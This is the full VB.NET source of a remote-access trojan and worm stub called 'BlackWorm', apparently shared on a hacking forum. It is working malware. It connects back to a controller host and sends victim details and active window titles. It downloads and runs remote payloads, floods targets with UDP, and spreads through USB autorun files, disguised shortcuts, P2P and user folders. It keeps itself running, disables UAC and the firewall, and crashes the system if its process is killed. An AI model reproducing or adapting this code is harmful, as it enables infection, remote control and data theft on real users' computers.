Imports System.Collections.Generic
Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Diagnostics
Imports System.Windows.Forms
Imports System.Net.Sockets
Imports System.Net
Imports System.IO
Imports System.Text
Imports Microsoft.Win32
Imports System.Collections
Imports System
' سورس الستب للتشفير البرمجي او إضافة خصائص له 
' Coded By : Black.Hacker
' اخر تحديث 31\3\1435
' إهداء الى موقع نقطة التطوير
' www.Dev-Point.com
' Black.Hacker - 2014
Public Module a
    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
    Public h As String = "[host]"
    Public port As Integer = "[port]"
    Public meltf As String = "[Melt]"
    Public Name As String = "[vn]"
    Public Y As String = "/j|n\"
    Public Ver As String = "2.4.0 [ Dark Edition ]"
    Public uexe As String = "[exe]"
    Public ulink As String = "[link]"
    Public up2p As String = "[p2p]"
    Public startUP As String = "[startname]"
    Public BD As String = "[BSOD]"
    Public exen As String = "[exen]"
    Public firewall As String = "[firewall]"
    Public ByUAC As String = "[UAC]"
    Public Mag As String = "[Msg]"
    Public FolderSpread As String = "[Folder]"
    Public F As New Microsoft.VisualBasic.Devices.Computer
    Public C As New TCP
    Public s As String = New IO.FileInfo(Application.ExecutablePath).Name
    Public EXE As New IO.FileInfo(Application.ExecutablePath)
    Delegate Sub InvokeDelegate()
    Public st As Integer = 0
    Public trd As Thread
    Public Sub Wss()
        If meltf = "True" Then
            Call sss.Melt()
        End If

        st = 0
        trd = New Thread(AddressOf StartWork)
        trd.IsBackground = True
        trd.Start() ' every 2 Seconds Add Startup Values

        If uexe = "True" Then
            Dim usbs As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
            Dim driver() As String = (IO.Directory.GetLogicalDrives)
            For Each usbs In driver
                Try
                    IO.File.Copy(Application.ExecutablePath, usbs & exen)
                    Dim AutoStart = New StreamWriter(usbs & "\autorun.inf")
                    AutoStart.WriteLine("[autorun]")
                    AutoStart.WriteLine("open=" & usbs & exen)
                    AutoStart.WriteLine("shellexecute=" & usbs & exen, 1)
                    AutoStart.WriteLine("shellopencommand=" & usbs & exen)
                    AutoStart.WriteLine("shellexplorecommand=" & usbs & exen)
                    AutoStart.WriteLine("ACTION=Perform a Virus Scan")
                    AutoStart.Close()
                    System.IO.File.SetAttributes(usbs & "autorun.inf", FileAttributes.Hidden)
                    System.IO.File.SetAttributes(usbs & exen, FileAttributes.Hidden)
                    Call filehide()
                Catch ex As Exception
                End Try
            Next
        End If

        If ulink = "True" Then
            Dim u As New USB
            u.ExeName = exen
            u.Start()
        End If

        If up2p = "True" Then
            Call p2p()
        End If

        If BD = "True" Then
            Try
                AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf ED
                pr(1) ' protect my process
            Catch ex As Exception
            End Try
        End If

        If ByUAC = "True" Then
            Call UAC()
        End If

        If firewall = "True" Then
            Call FirfeWall()
        End If
        If FolderSpread = "True" Then
            Call getFolders("C:\Users\" & Environment.UserName & "\")
            Call getFolders("C:\Users\" & Environment.UserName & "\Desktop\")
            Call getFolders("C:\Users\" & Environment.UserName & "\Documents\")
        End If
        Call Bypass_Duplication_Victims()
        Dim oldwindow As String = ""
        While True
            Thread.CurrentThread.Sleep(5000)
            Dim s = ACT()
            If s <> oldwindow Then
                oldwindow = s
                C.Send("!1" & Y & s)
            End If
        End While

    End Sub
    Public Sub Main()
        Call Wss()
    End Sub
    Public Sub IND(ByVal b As Byte())
        Dim A As String() = Split(BS(b), Y)
        On Error Resume Next
        Select Case A(0)
            Case "ping"
                C.Send("ping")
            Case "CloseServer"
                pr(0)
                ED()
                Application.Exit()
                End
            Case "RestartServer"
                Application.Restart()
                End
            Case "sendfile"
                IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(IO.Path.GetTempPath & A(1))
            Case "download"
                My.Computer.Network.DownloadFile(A(1), IO.Path.GetTempPath & A(2))
                Threading.Thread.CurrentThread.Sleep(1000)
                Process.Start(IO.Path.GetTempPath & A(2))

            Case "UDP"
                On Error Resume Next
                Dim iphe As IPHostEntry = Dns.GetHostEntry(A(1))
                Dim udpClient As New UdpClient
                Dim GLOIP As IPAddress
                Dim por1t As String = A(2)
                Dim bytCommand As Byte() = New Byte() {}
                GLOIP = IPAddress.Parse(iphe.AddressList(0).ToString()) '<---
                udpClient.Connect(GLOIP, por1t) '<---
                bytCommand = Encoding.ASCII.GetBytes("BLAAAAAAAAAAAAAAA!/asldifrhXGJRCVKJJEAWTBRHGMGGaslkdfhaseoirfhasdhfjXGJRCVKJJEAWTBRHGMGGasdzf483975634597328528934tzhXGJRCVKJJEAWTBRHGMGGeufgz34975638q9ruweirf​XGJRCVKJJEAWTBRHGMGGhsdkjvnwu45z6384975weuirhjsfndjvzw438563qXGJRCVKJJEAWTBRHGMGG84ruwajfjsadfhdfhgq349875q390rXGJRCVKJJEAWTBRHGMGGuf)=/()%&§%&%XGJRCVKJJEAWTBRHGMGGJGKTCMFPHBJKEZEFTJLMNMEEJJYATLRJCTNYMSXWWARWJIKELWOYXNKVFDOWRYXARGFGKLVUPWCMKECEQRXUXGWJTWSTHZEZKXSH!!!!@#$%^&*(())_+|}{}{}{}{hjbgipsdbgbgdsipsdgii9375hdasih0=398pofjkphdi9-3\-49jdfisodf3-49947-932fskdnf9")
                udpClient.Send(bytCommand, bytCommand.Length)
            Case "Logoff"
                Shell("shutdown -l -t 00", AppWinStyle.Hide)
            Case "Restart"
                Shell("shutdown -r -t 00", AppWinStyle.Hide)
            Case "Shutdown"
                Shell("shutdown -s -t 00", AppWinStyle.Hide)
            Case "money" ' Coded by Blάĉк.Hάĉкєr
                On Error Resume Next
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                Process.Start(A(1))
                BlockInput(True)
                Thread.Sleep(2000)
                BlockInput(False)
            Case "uninstall"
                On Error Resume Next
                DStartup(startUP)
                pr(0)
                Application.Exit()
                End
            Case "OpenLink"
                On Error Resume Next
                Process.Start(A(1))
        End Select
    End Sub
    Public Function INF() As String
        Dim x As String = Name & "_" & HWD() & Y
        ' get pc name
        Try
            x &= Environment.MachineName & Y
        Catch ex As Exception
            x &= "??" & Y
        End Try
        ' get User name
        Try
            x &= Environment.UserName & Y
        Catch ex As Exception
            x &= "??" & Y
        End Try
        ' get Country
        x &= Gcc() & Y
        ' Get OS
        Try
            x += F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            x += "??" '& Y
        End Try
        x += "SP"
        Try
            Dim k As String() = Split(Environment.OSVersion.ServicePack, " ")
            If k.Length = 1 Then
                x &= "0"
            End If
            x &= k(k.Length - 1)
        Catch ex As Exception
            x &= "0"
        End Try
        Try
            If Environment.GetFolderPath(38).Contains("x86") Then
                x += " x64" & Y
            Else
                x += " x86" & Y
            End If
        Catch ex As Exception
            x += Y
        End Try
        ' cam
        If Cam() Then
            x &= "Yes" & Y
        Else
            x &= "No" & Y
        End If
        ' version
        x &= Ver & Y
        ' ping
        x &= "" & Y
        x &= ACT() & Y
        Return x
    End Function
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    '====================================== Window API
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr ' Get Active window Handle
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Public Function ACT() As String ' Get Active Window Text
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ""
            End If
            Dim w As Integer
            w = GetWindowTextLength(h)
            Dim t As String = StrDup(w + 1, "*")
            GetWindowText(h, t, w + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return t
            Else
                Try
                    Return Diagnostics.Process.GetProcessById(pid).MainWindowTitle()
                Catch ex As Exception
                    Return t
                End Try
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Public Function BS(ByVal b As Byte()) As String ' bytes to String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Public Function SB(ByVal s As String) As Byte() ' String to bytes
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    '=============================== PC Country
    <DllImport("kernel32.dll")> _
    Private Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
    End Function
    Public Function Gcc() As String
        Try
            Dim d = New System.Text.StringBuilder(256)
            Dim i As Integer = GetLocaleInfo(&H400, &H7, d, d.Capacity)
            If i > 0 Then
                Return d.ToString().Substring(0, i - 1)
            End If
        Catch ex As Exception
        End Try
        Return "X"
    End Function
    '======== process protect With BSOD
    <DllImport("ntdll")> _
    Public Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function
    Sub pr(ByVal i As Integer) ' protect process With BSOD
        ' if i= 0  Unprotect, if i=1 Protect
        Try
            NtSetInformationProcess(Process.GetCurrentProcess.Handle, 29, i, 4)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ED() ' unprotect me if windows restart or logoff
        pr(0)
    End Sub
    '=============================== Cam Drivers
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
    ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
    ByVal cbVer As Integer) As Boolean
    Public Function Cam() As Boolean
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return True
                End If
            Next
        Catch ex As Exception
        End Try
        Return False
    End Function

End Module
Public Class TCP
    Public SPL As String = "[endof]"
    Public C As Net.Sockets.TcpClient
    Sub New()
        Dim t As New Threading.Thread(AddressOf RC)
        t.Start()
    End Sub
    Public Sub Send(ByVal b As Byte())
        If CN = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(SPL), 0, SPL.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            CN = False
        End Try
    End Sub
    Public Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub
    Private CN As Boolean = False
    Sub RC()
        Dim M As New IO.MemoryStream ' create memory stream
        Dim lp As Integer = 0
re:
        Try
            If C Is Nothing Then GoTo e
            If C.Client.Connected = False Then GoTo e
            If CN = False Then GoTo e
            lp += 1
            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then ' split packet..
                    Dim A As Array = fx(M.ToArray, SPL)
                    Dim T As New Thread(AddressOf IND)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
e:      ' clear things and ReConnect
        CN = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            C.Client.Connect(h, port)
            CN = True
            Send("!0" & Y & INF()) ' Send My INFO after connect
        Catch ex As Exception
            Threading.Thread.CurrentThread.Sleep(2500)
            GoTo e
        End Try
        GoTo re
    End Sub
End Class
Public Class USB
    ' bY njq8
    Private Off As Boolean = False
    Dim thread As Threading.Thread = Nothing
    Dim r As New Random
    Public ExeName As String = "BlackWorm.exe"
    Public Sub Start()
        If thread Is Nothing Then
            thread = New Threading.Thread(AddressOf usb, 1)
            thread.Start()
        End If
    End Sub
    Public Sub clean()
        Off = True
        Do Until thread Is Nothing
            Threading.Thread.CurrentThread.Sleep(1)
        Loop
        For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
            Try
                If x.IsReady Then
                    If x.DriveType = IO.DriveType.Removable Or _
                    x.DriveType = IO.DriveType.CDRom Then
                        If IO.File.Exists(x.Name & ExeName) Then
                            IO.File.SetAttributes(x.Name _
                            & ExeName, IO.FileAttributes.Normal)
                            IO.File.Delete(x.Name & ExeName)
                        End If
                        For Each xx As String In IO.Directory.GetFiles(x.Name)
                            Try
                                IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                If xx.ToLower.EndsWith(".lnk") Then
                                    IO.File.Delete(xx)
                                End If
                            Catch ex As Exception
                            End Try
                        Next
                        For Each xx As String In IO.Directory.GetDirectories(x.Name)
                            Try
                                With New IO.DirectoryInfo(xx)
                                    .Attributes = IO.FileAttributes.Normal
                                End With
                            Catch ex As Exception
                            End Try
                        Next
                    End If
                End If
            Catch ex As Exception
            End Try
        Next
    End Sub
    Sub usb()
        Off = False
        Do Until Off = True
            For Each x In IO.DriveInfo.GetDrives
                Try
                    If x.IsReady Then
                        If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType _
                        .Removable Or x.DriveType = IO.DriveType.CDRom Then
                            Try
                                If IO.File.Exists(x.Name & ExeName) Then
                                    IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal)
                                End If
                                IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                For Each xx As String In IO.Directory.GetFiles(x.Name)
                                    If IO.Path.GetExtension(xx).ToLower <> ".lnk" And _
                                    xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then
                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                        IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                        With CreateObject("WScript.Shell").CreateShortcut _
                                        (x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                            .TargetPath = "cmd.exe"
                                            .WorkingDirectory = ""
                                            .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                             & " " & ChrW(34)) & "&start " & New IO.FileInfo(xx) _
                                            .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
                                            .IconLocation = GetIcon(IO.Path.GetExtension(xx))
                                            .Save()
                                        End With
                                    End If
                                Next
                                For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                    IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                    IO.File.Delete(x.Name & New IO.DirectoryInfo(xx).Name & " .lnk")
                                    With CreateObject("WScript.Shell") _
                                    .CreateShortcut(x.Name & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                        .TargetPath = "cmd.exe"
                                        .WorkingDirectory = ""
                                        .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                         & " " & ChrW(34)) & "&explorer /root,""%CD%" & New  _
                                         IO.DirectoryInfo(xx).Name & """ & exit"
                                        .IconLocation = "%SystemRoot%\system32\SHELL32.dll,3" '< folder icon
                                        .Save()
                                    End With
                                Next
                            Catch ex As Exception
                            End Try
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
            Threading.Thread.CurrentThread.Sleep(3000)
        Loop
        thread = Nothing
    End Sub
    Function GetIcon(ByVal ext As String) As String
        Try
            Dim r = Microsoft.Win32.Registry _
            .LocalMachine.OpenSubKey("Software\Classes\", False)
            Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False) _
            .GetValue("") & "\DefaultIcon\").GetValue("", "")
            If e.Contains(",") = False Then e &= ",0"
            Return e
        Catch ex As Exception
            Return ""
        End Try
    End Function
End Class
Module Exta
    Public Sub AStartup(ByVal Name As String, ByVal Path As String)
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public [me] As String = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName)
    Public Sub p2p()
        Try
            Dim arSharedFolders As New ArrayList()
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Downloads") 'Spread the Server in "Downloaders"
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\My Shared Folder") 'Spread the Server in "My Shared Folder"
            arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Shared") 'Spread the Server in "Shared", etc....

            Dim folder As IEnumerator = arSharedFolders.GetEnumerator()
            While folder.MoveNext()
                Dim tada As String = Convert.ToString(folder.Current)
                If Directory.Exists(tada) Then
                    Dim progDir As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
                    For Each d As String In Directory.GetDirectories(progDir)
                        Dim app As String = (tada & "\") + d.Substring(d.LastIndexOf("\")).Replace("\", String.Empty) & ".exe"
                        File.Copy([me], app, True)
                    Next
                End If
            End While
        Catch s As Exception
        End Try
    End Sub
    Public Sub filehide()
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 0)
    End Sub
    Public Sub DStartup(ByVal Name As String)
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.DeleteValue(Name)
    End Sub
    Public Sub UAC()
        If (My.Computer.Info.OSFullName.Contains("Vista") Or My.Computer.Info.OSFullName.Contains("7")) Then
            Try
                Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", True)
                If (key.GetValue("EnableLUA").ToString = "1") Then
                    key.SetValue("EnableLUA", "0")
                End If
            Catch x As Exception

            End Try
        End If
    End Sub
End Module
Module Bypass
    Public Sub FirfeWall()
        Dim process As New Process
        Dim str As String = "netsh.exe"
        process.StartInfo.Arguments = "firewall set opmode disable"
        process.StartInfo.FileName = str
        process.StartInfo.UseShellExecute = False
        process.StartInfo.RedirectStandardOutput = True
        process.StartInfo.CreateNoWindow = True
        process.Start()
        process.WaitForExit()
    End Sub
End Module
Module StartEvrey
    Public Sub StartWork()
star:
        If st <> 0 Then Exit Sub
        Thread.Sleep(2000)
        If meltf = "True" Then
            AStartup(startUP, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & exen)
        Else
            AStartup(startUP, Application.ExecutablePath)
        End If
        GoTo star
    End Sub
End Module
Module USB_Spread
    Public Sub infect(ByVal OutName As String)
        Dim usbs As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
        Dim driver() As String = (IO.Directory.GetLogicalDrives)
        For Each usbs In driver
            Try
                IO.File.Copy(Application.ExecutablePath, usbs & OutName)
                Dim AutoStart = New StreamWriter(usbs & "\autorun.inf")
                AutoStart.WriteLine("[autorun]")
                AutoStart.WriteLine("open=" & usbs & OutName)
                AutoStart.WriteLine("shellexecute=" & usbs & OutName, 1)
                AutoStart.WriteLine("shellopencommand=" & usbs & OutName)
                AutoStart.WriteLine("shellexplorecommand=" & usbs & OutName)
                AutoStart.WriteLine("action=Perform a Virus Scan")
                AutoStart.Close()
                System.IO.File.SetAttributes(usbs & "autorun.inf", FileAttributes.Hidden)
                System.IO.File.SetAttributes(usbs & OutName, FileAttributes.Hidden)
            Catch ex As Exception
            End Try
        Next
    End Sub
    Public Sub Bypass_Duplication_Victims()
        Dim appProc() As Process
        Dim strModName, strProcName As String
        strModName = Process.GetCurrentProcess.MainModule.ModuleName
        strProcName = System.IO.Path.GetFileNameWithoutExtension(strModName)
        appProc = Process.GetProcessesByName(strProcName)
        If appProc.Length > 1 Then
            End
        End If
    End Sub
End Module
Module sss
    Public Sub Melt()
        IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft")
        If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & exen Then
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
            End If
        Else
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
            End If
            If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & exen) Then
                Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & exen) : Catch : End Try
                IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & exen)
                IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & exen)
                End
            Else
                IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & exen)
                IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "Microsoft" & "\" & exen)
                End
            End If
        End If
    End Sub
End Module
Module Folder_Spread
    Public Function getFolders(ByVal location) As String ' Ask for folders
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders = subdi.FullName
            If File.Exists(folders & "\" & exen) Then
                IO.File.Delete(folders & "\" & exen)
                IO.File.Copy(Application.ExecutablePath, folders & "\" & exen)
                IO.File.SetAttributes(folders & "\" & exen, FileAttributes.Hidden)
            Else
                IO.File.Copy(Application.ExecutablePath, folders & "\" & exen)
                IO.File.SetAttributes(folders & "\" & exen, FileAttributes.Hidden)
            End If
        Next
        Call filehide()
        Return folders
    End Function
End Module
